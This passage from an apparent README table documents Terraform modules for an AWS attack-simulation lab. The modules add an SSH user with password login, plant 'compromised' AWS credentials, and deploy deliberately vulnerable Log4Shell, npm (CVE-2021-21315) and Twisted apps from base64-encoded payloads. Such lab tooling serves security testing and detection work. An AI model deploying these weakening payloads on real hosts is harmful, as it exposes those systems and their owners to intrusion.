                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-deploy-ssh-user                                                   | ./modules/ssm/deploy-ssh-user                                  | ssm_deploy_ssh_user                        | context.aws.ssm.ssh_user                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                                  | <pre>locals \{<br/>    password = try\(length\(var\.inputs\["password"\]\),"false"\) \!= "false" ? var\.inputs\["password"\] :  random\_password\.password\.result<br/>    payload = <<\-EOT<br/>    log "starting script"<br/>    log "Setting up user: $\{var\.inputs\["username"\]\}"<br/>    adduser \-\-gecos "" \-\-disabled\-password $\{var\.inputs\["username"\]\} \|\| log "$\{var\.inputs\["username"\]\} user already exists"<br/>    log "Setting passwd: $\{local\.password\}"<br/>    echo '$\{var\.inputs\["username"\]\}:$\{local\.password\}' \| chpasswd<br/>    log "Adding user to allowed passwd auth in sshd\_config\.d"<br/>    cat > /etc/ssh/sshd\_config\.d/common\-user\-passwd\-auth\.conf <<\-EOF <br/>    \# Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2\-user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo 'We talked about this guys\. No SSH for you\!'<br/>    EOF<br/>    cat > /etc/ssh/sshd\_config\.d/custom\-user\-passwd\-auth\.conf <<\-EOF <br/>    Match User $\{var\.inputs\["username"\]\}<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log "Restarting ssh service"<br/>    service ssh reload<br/>    log "Done\."<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>        password = local\.password<br/>    \}<br/>\}<br/><br/>resource "random\_password" "password" \{<br/>  length           = 16<br/>  special          = true<br/>  override\_special = "\!\#$%&\*\(\)\-\_=\+\[\]\{\}<>:?"<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-aws-credentials                                                   | ./modules/ssm/deploy-aws-credentials                           | ssm_deploy_secret_aws_credentials          | context.aws.ssm.aws_credentials                                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "aws_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-aws-credentials                           | <pre>locals \{<br/>    tool = "aws"<br/>    aws\_creds = join\("\\n", \[ for u,k in var\.inputs\["compromised\_credentials"\]: "$\{k\.rendered\}" \]\)<br/>    payload = <<\-EOT<br/>    log "Setting up aws cred environment variables\.\.\."<br/>    $\{local\.aws\_creds\}<br/>    log "Deploying aws credentials\.\.\."<br/>    mkdir \-p ~/\.aws<br/>    cat <<\-EOF > ~/\.aws/credentials<br/>    \[default\]<br/>    aws\_access\_key\_id=$AWS\_ACCESS\_KEY\_ID<br/>    aws\_secret\_access\_key=$AWS\_SECRET\_ACCESS\_KEY<br/>    EOF<br/>    cat <<\-EOF > ~/\.aws/config<br/>    \[default\]<br/>    region=$AWS\_DEFAULT\_REGION<br/>    output=json<br/>    EOF<br/>    log "Running: aws get\-caller\-identity"<br/>    aws sts get\-caller\-identity \-\-output json >> $LOGFILE 2>&1 <br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        while \! command \-v $\{local\.tool\} &>/dev/null; do<br/>            log "$\{local\.tool\} not found \- waiting";<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        while \! command \-v $\{local\.tool\} &>/dev/null; do<br/>            log "$\{local\.tool\} not found \- waiting";<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-vulnerable-docker-log4j-app                                       | ./modules/ssm/deploy-docker-log4j-app                          | ssm_deploy_docker_log4j_app                | context.aws.ssm.vulnerable.docker.log4j_app                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app                          | <pre>locals \{<br/>    image = "ghcr\.io/christophetd/log4shell\-vulnerable\-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929"<br/>    name = "log4shell"<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.name\}\` \]\]; then docker stop $\{local\.name\}; fi<br/>        log "$\(echo 'docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\}'\)"<br/>        docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\} >> $LOGFILE 2>&1<br/>        docker ps \-a >> $LOGFILE 2>&1<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = "curl"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = "curl"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-vulnerable-log4j-app                                              | ./modules/ssm/deploy-log4j-app                                 | ssm_deploy_log4j_app                       | context.aws.ssm.vulnerable.log4j_app                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                                 | <pre>locals \{<br/>    app\_dir = "/vuln\-log4j\-app"<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_log4j\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_log4j\_app\_target\.log<br/>    <br/>    rm \-rf $\{local\.app\_dir\}<br/>    mkdir $\{local\.app\_dir\}<br/>    cd $\{local\.app\_dir\}<br/><br/>    log "creating local files\.\.\."<br/>    echo $\{base64gzip\(local\.web\)\} \| base64 \-d \| gunzip > web\.py<br/>    echo $\{base64gzip\(local\.ldap\)\} \| base64 \-d \| gunzip  > ldap\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip > requirements\.txt<br/><br/>    \# install java 8u131<br/>    log "checking for jdk1\.8\.0\_131\.\.\."<br/>    if \[ \! \-d /usr/java/jdk1\.8\.0\_131/ \]; then<br/>        log "jdk1\.8\.0\_131 not found \- installing\.\.\."<br/>        wget \-c \-\-header "Cookie: oraclelicense=accept\-securebackup\-cookie" http://download\.oracle\.com/otn\-pub/java/jdk/8u131\-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk\-8u131\-linux\-x64\.tar\.gz<br/>        mkdir \-p /usr/java<br/>        sudo tar \-xvzf jdk\-8u131\-linux\-x64\.tar\.gz \-C /usr/java<br/>    else<br/>        log "jdk1\.8\.0\_131 found \- skipping install"<br/>    fi<br/>    <br/><br/>    \# update java path<br/>    log "setting up java environment for build\.\.\."<br/>    export JAVA\_HOME=/usr/java/jdk1\.8\.0\_131/<br/>    sudo update\-alternatives \-\-install /usr/bin/java java $$\{JAVA\_HOME%\*/\}/bin/java 20000<br/>    sudo update\-alternatives \-\-install /usr/bin/javac javac $$\{JAVA\_HOME%\*/\}/bin/javac 20000<br/>    <br/>    java \-version >> $LOGFILE 2>&1<br/><br/>    \# download gradle 7\.3\.1<br/>    log "checking for gradle 7\.3\.1\.\.\."<br/>    if \[ \! \-d /opt/gradle/gradle\-7\.3\.1 \]; then<br/>        log "gradle not found \- installing\.\.\."<br/>        wget https://services\.gradle\.org/distributions/gradle\-7\.3\.1\-bin\.zip<br/>        mkdir /opt/gradle<br/>        unzip \-d /opt/gradle gradle\-7\.3\.1\-bin\.zip<br/>    else<br/>        log "gradle 7\.3\.1 found \- skipping install" <br/>    fi<br/><br/>    \# update gradle path<br/>    log "updating environment PATH to include gradle\.\.\."<br/>    export PATH=$PATH:/opt/gradle/gradle\-7\.3\.1/bin<br/>    gradle \-\-version >> $LOGFILE 2>&1<br/><br/>    \# clone the log4shell vulnerable app<br/>    log "cloning https://github\.com/christophetd/log4shell\-vulnerable\-app\.\.\."<br/>    git clone https://github\.com/christophetd/log4shell\-vulnerable\-app<br/>    cd log4shell\-vulnerable\-app<br/>    log "running gradle build\.\.\."<br/>    nohup gradle bootJar \-\-no\-daemon &<br/>    GRADLE\_PID=$\!<br/>    while kill \-0 $GRADLE\_PID 2> /dev/null; do<br/>        log "Process is still running\.\.\."<br/>        sleep 30<br/>    done<br/>    log "gradle build complete\."<br/>    <br/>    ls \-ltr build/libs/\*\.jar >> $LOGFILE 2>&1<br/><br/>    \# copy java jar<br/>    log "Copying java jar\.\."<br/>    cp build/libs/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar >> $LOGFILE 2>&1<br/>    <br/>    \# change to app root dir<br/>    cd $\{local\.app\_dir\}<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting app"<br/>        if pgrep \-f "log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar"; then<br/>            kill \-9 $\(pgrep \-f "log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar"\)<br/>        fi<br/>        screen \-S vuln\_log4j\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_log4j\_app\_target\.log \-S vuln\_log4j\_app\_target \-m java \-jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar \-\-server\.port=$\{var\.inputs\["listen\_port"\]\}<br/>        screen \-S vuln\_log4j\_app\_target \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl unzip git"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl unzip git"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    web = file\(<br/>                            "$\{path\.module\}/resources/web\.py",<br/>                        \)<br/><br/>    ldap = file\(<br/>                            "$\{path\.module\}/resources/ldap\.py",<br/>                        \)<br/>    requirements = file\(<br/>                            "$\{path\.module\}/resources/requirements\.txt",<br/>                        \)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| attacker-vulnerable-npm-app                                                | ./modules/ssm/deploy-npm-app                                   | ssm_deploy_npm_app                         | context.aws.ssm.vulnerable.npm_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                                   | <pre>locals \{<br/>    repo = "https://github\.com/ForbiddenProgrammer/CVE\-2021\-21315\-PoC"<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_npm\_app\_target \-X quit<br/>    truncate \-s 0 /tmp/vuln\_npm\_app\_target\.log<br/>    log "checking for git\.\.\."<br/>    while \! command \-v git; do<br/>        log "git not found \- waiting"<br/>        sleep 10<br/>    done<br/>    log "git: $\(command \-v  git\)"<br/>    rm \-rf /vuln\_npm\_app\_target && \\<br/>    mkdir /vuln\_npm\_app\_target && \\<br/>    cd /vuln\_npm\_app\_target && \\<br/>    git clone $\{local\.repo\} && \\<br/>    cd CVE\-2021\-21315\-PoC && \\<br/>    echo $\{base64gzip\(local\.index\_js\_base64\)\} \| base64 \-d \| gunzip > index\.js<br/>    npm install >> $LOGFILE 2>&1<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting app"<br/>        screen \-S vuln\_npm\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_npm\_app\_target\.log \-S vuln\_npm\_app\_target \-m npm start \-\-prefix /vuln\_npm\_app\_target/CVE\-2021\-21315\-PoC<br/>        screen \-S vuln\_npm\_app\_target \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl nodejs npm"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl nodejs npm"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    index\_js\_base64 = templatefile\(<br/>                "$\{path\.module\}/resources/index\.js",<br/>                \{<br/>                    listen\_port = var\.inputs\["listen\_port"\]<br/>                \}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-vulnerable-python3-twisted-app                                    | ./modules/ssm/deploy-python3-twisted-app                       | ssm_deploy_python3_twisted_app             | context.aws.ssm.vulnerable.python3_twisted_app                            | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app                       | <pre>locals \{<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_python3\_twisted\_app\_target\.log<br/>    if command \-v $PACKAGE\_MANAGER && $PACKAGE\_MANAGER list \| grep "python3\-twisted" \| grep "18\.9\.0\-11ubuntu0\.20\.04"; then<br/>        mkdir \-p /vuln\_python3\_twisted\_app<br/>        cd /vuln\_python3\_twisted\_app<br/>        echo $\{base64gzip\(local\.app\_py\)\} \| base64 \-d \| gunzip > app\.py<br/>        echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip > requirements\.txt<br/>        log "installing requirements\.\.\."<br/>        python3 \-m pip install \-r requirements\.txt >> $LOGFILE 2>&1<br/>        log "requirements installed"<br/>        <br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>        while true; do<br/>            log "starting app"<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile /tmp/vuln\_python3\_twisted\_app\_target\.log \-S vuln\_python3\_twisted\_app\_target \-m python3 /vuln\_python3\_twisted\_app/app\.py<br/>            screen \-S 